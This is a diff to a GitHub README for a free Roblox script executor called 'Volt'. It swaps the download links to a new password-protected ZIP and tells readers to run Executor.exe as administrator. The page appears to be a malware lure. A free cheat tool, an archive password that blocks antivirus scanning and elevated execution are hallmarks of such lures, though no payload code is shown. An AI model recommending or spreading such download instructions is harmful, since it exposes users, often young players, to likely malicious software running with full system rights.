@@ -4,7 +4,7 @@ Free Roblox executor with auto-update. Supports all scripts. Working 2026
 <img width="1280" height="720" alt="image" src="https://github.com/user-attachments/assets/31e59888-4362-43f2-af44-631ba0479fc6" />
 
 
-## [Download Volt  Executor - Latest 2026 Build](https://github.com/Lacquerbypresent/Roblox-Executor-Free-Volt-2026/releases/download/Download/Volt-Executor-2026.zip)
+## [Download Volt  Executor - Latest 2026 Build](https://github.com/Lacquerbypresent/Roblox-Executor-Free-Volt-2026/releases/download/Download/Volt-Executor-2026v2.zip)
 > ⚠️ Password for the archive is zicoroblox
 
 # Volt Executor
@@ -52,7 +52,7 @@ Volt is a **script execution tool** that unlocking features like:
 
 
 ### 🔧 How to  Install Steps
-1. ## [Download](https://github.com/Lacquerbypresent/Roblox-Executor-Free-Volt-2026/releases/download/Download/Volt-Executor-2026.zip) the official ZIP archive of Volt Executor.
+1. ## [Download](https://github.com/Lacquerbypresent/Roblox-Executor-Free-Volt-2026/releases/download/Download/Volt-Executor-2026v2.zip) the official ZIP archive of Volt Executor.
 2. Right-click Executor.exe and select Run as administrator if required.
 3. Follow the on-screen instructions to complete the installation.
 
